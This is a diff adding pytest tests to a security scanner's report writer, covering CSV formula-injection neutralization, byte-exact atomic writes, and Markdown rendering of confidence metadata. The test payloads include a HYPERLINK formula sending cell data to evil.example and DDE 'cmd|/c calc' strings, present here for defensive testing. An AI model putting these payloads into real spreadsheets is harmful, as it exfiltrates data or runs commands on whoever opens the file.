@@ -10,6 +10,7 @@ import pytest
 
 from strix.report.html_report import render_html_report
 from strix.report.writer import (
+    atomic_write_text,
     read_run_record,
     render_complete_report,
     render_vulnerability_md,
@@ -165,6 +166,64 @@ def test_write_vulnerabilities_creates_markdown_csv_and_json(tmp_path: Path) -> 
     assert csv_rows[0]["severity"] == "CRITICAL"
 
 
+@pytest.mark.parametrize(
+    "payload",
+    [
+        '=HYPERLINK("http://evil.example/leak?d="&A1,"View")',
+        "+cmd|'/c calc'!A1",
+        "@SUM(1+1)*cmd|'/c calc'!A1",
+        "-2+3+cmd|'/c calc'!A1",
+        "\t leading tab",
+        "\r leading carriage return",
+    ],
+)
+def test_write_vulnerabilities_csv_neutralizes_formula_injection(
+    tmp_path: Path,
+    payload: str,
+) -> None:
+    # Titles quote text from the scanned target, so a finding title can begin with
+    # a spreadsheet formula trigger. csv escapes CSV syntax but not formula
+    # triggers, so the cell has to be neutralized before it is written.
+    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    title = csv_rows[0]["title"]
+    assert title.startswith("'")
+    assert not title.startswith(("=", "+", "-", "@", "\t", "\r"))
+
+
+def test_write_vulnerabilities_csv_preserves_payload_after_guard(tmp_path: Path) -> None:
+    payload = "=1+1"
+    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    assert csv_rows[0]["title"] == "'=1+1"  # guard prefix only, payload intact
+
+
+def test_write_vulnerabilities_csv_leaves_benign_titles_unchanged(tmp_path: Path) -> None:
+    write_vulnerabilities(tmp_path, [_sample_report(title="SQL Injection in /login")], set())
+
+    csv_rows = list(
+        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
+    )
+    assert csv_rows[0]["title"] == "SQL Injection in /login"
+
+
+def test_atomic_write_text_keeps_payload_byte_for_byte(tmp_path: Path) -> None:
+    # The CSV index carries its own \r\n terminators, so newline translation would
+    # turn every row ending into \r\r\n on Windows.
+    payload = "a,b\r\nc,d\r\n"
+    path = tmp_path / "index.csv"
+
+    atomic_write_text(path, payload)
+
+    assert path.read_bytes() == payload.encode("utf-8")
+
+
 def test_write_vulnerabilities_skips_already_saved_ids(tmp_path: Path) -> None:
     reports = [_sample_report(id="vuln-0001")]
     saved: set[str] = {"vuln-0001"}
@@ -293,3 +352,30 @@ def test_html_report_accepts_delivery_markdown_headings() -> None:
 
     assert "历史运行摘要。" in report
     assert "历史运行方法。" in report
+
+
+def test_render_vulnerability_md_surfaces_calibration_metadata() -> None:
+    """Confidence, the case against the finding, and retest status are part of
+    the deliverable — storing them without rendering hides the reasoning."""
+    md = render_vulnerability_md(
+        {
+            "id": "vuln-0009",
+            "title": "SSRF in URL preview",
+            "severity": "high",
+            "timestamp": "2026-07-02 10:00:00 UTC",
+            "description": "Fetches user-supplied URLs.",
+            "confidence": "medium",
+            "counterevidence": "Egress appears filtered at the network layer.",
+            "confidence_rationale": "Reproduced once out of three attempts.",
+            "severity_change_conditions": "Critical if egress filtering is removed.",
+            "remediation_steps": "Allowlist destinations.",
+            "fix_verification": "Not retested.",
+        }
+    )
+
+    assert "**置信度：** Medium" in md
+    assert "## 反证" in md
+    assert "Egress appears filtered at the network layer." in md
+    assert "## 置信度依据" in md
+    assert "## 严重度变化条件" in md
+    assert "## 修复验证" in md
